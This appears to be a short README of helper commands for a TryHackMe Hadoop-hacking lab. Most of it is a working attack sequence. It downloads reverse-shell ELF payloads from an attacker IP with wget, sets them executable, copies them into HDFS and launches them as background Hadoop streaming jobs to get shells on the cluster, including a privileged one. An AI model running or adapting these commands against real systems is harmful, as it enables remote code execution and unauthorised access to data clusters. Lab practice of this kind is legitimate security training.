# THM-hackinghadoop

only some small commands for faster assignments of variables in the rev shell ... and some commands for creating the rev shell

!!! This is no solution to the task !!!


KINIT=/usr/bin/kinit
KLIST=/usr/bin/klist
HADOOP=/usr/local/hadoop-2.7.7/bin/hadoop
HADOOP_STREAMING=/usr/local/hadoop-2.7.7/share/hadoop/tools/lib/hadoop-streaming-2.7.7.jar
KEYTABS=/etc/security/keytabs

cd /tmp
wget http://10.8.0.2/shell.elf
wget http://10.8.0.2/shell-priv.elf
chmod 777 /tmp/shell.elf
chmod 777 /tmp/shell-priv.elf

$HADOOP fs -touchz /tmp/1
$HADOOP fs -touchz /tmp/2

$HADOOP fs -copyfromlocal /tmp/shell.elf /tmp/shell.elf
$HADOOP fs -copyfromlocal /tmp/shell-priv.elf /tmp/shell-priv.elf

$HADOOP fs -chmod 777 /tmp/shell.elf
$HADOOP fs -chmod 777 /tmp/shell-priv.elf

$HADOOP jar $HADOOP_STREAMING -input /tmp/1 -output /tmp/a -mapper /tmp/shell.elf -reducer NONE -file /tmp/shell.elf -background
$HADOOP jar $HADOOP_STREAMING -input /tmp/2 -output /tmp/b -mapper /tmp/shell-priv.elf -reducer NONE -file /tmp/shell-priv.elf -background
